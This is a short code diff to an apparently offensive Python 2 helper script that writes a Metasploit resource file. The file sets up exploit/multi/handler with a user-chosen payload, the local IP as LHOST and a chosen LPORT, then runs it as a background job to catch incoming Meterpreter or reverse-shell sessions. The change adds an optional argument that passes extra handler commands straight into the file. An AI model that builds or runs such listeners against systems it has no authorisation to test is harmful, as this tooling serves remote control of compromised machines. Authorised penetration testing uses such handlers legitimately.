@@ -7,7 +7,7 @@ import pkgutil
 import sys
 
 def main():
-    
+
     install = (1 if pkgutil.find_loader("netifaces") else 0)
     if install == 1:
         getIPaddress()
@@ -27,8 +27,11 @@ def printFile(ip):
     if os.path.isfile('meterpreter.rc'):
         os.remove('meterpreter.rc')
 
+    if len(sys.argv) > 3:
+        toFile = "use exploit/multi/handler\nset PAYLOAD "+sys.argv[1]+"\nset LHOST "+ip+"\nset LPORT "+sys.argv[2]+"\n"+sys.argv[3].decode("string_escape")+"\nset ExitOnSession false\nexploit -j -z"
+    else:
+        toFile = "use exploit/multi/handler\nset PAYLOAD "+sys.argv[1]+"\nset LHOST "+ip+"\nset LPORT "+sys.argv[2]+"\nset ExitOnSession false\nexploit -j -z"
     print "[+] -- Creating Metasploit Script"
-    toFile = "use exploit/multi/handler\nset PAYLOAD "+sys.argv[1]+"\nset LHOST "+ip+"\nset LPORT "+sys.argv[2]+"\nset ExitOnSession false\nexploit -j -z"
     with open('meterpreter.rc', 'a') as f:
         f.write(toFile)
 
